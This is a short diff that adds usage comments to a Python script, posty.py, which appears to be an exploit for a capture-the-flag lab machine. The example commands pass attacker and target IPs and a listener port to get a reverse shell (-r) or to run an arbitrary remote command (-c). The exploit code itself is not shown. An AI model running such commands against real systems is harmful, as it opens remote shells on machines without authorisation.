@@ -1,4 +1,12 @@
 #!/usr/bin/env python3
+#################################################################
+###################### USAGE EXAMPLE ############################
+# python3 -W ignore posty.py --lhost=10.10.12.12 --rhost=10.129.244.160 --lport=4444 -r
+# CONSIDER USING -W ignore, since it displays a lot of warnings
+# You can also provide -c parameter instead of -r to execute the command you want.
+# python3 -W ignore posty.py --lhost=10.10.12.12 --rhost=10.129.244.160 --lport=4444 -c "id"
+#################################################################
+
 from Crypto.Cipher import AES
 from hashlib import sha256
 from Crypto.Util.Padding import pad
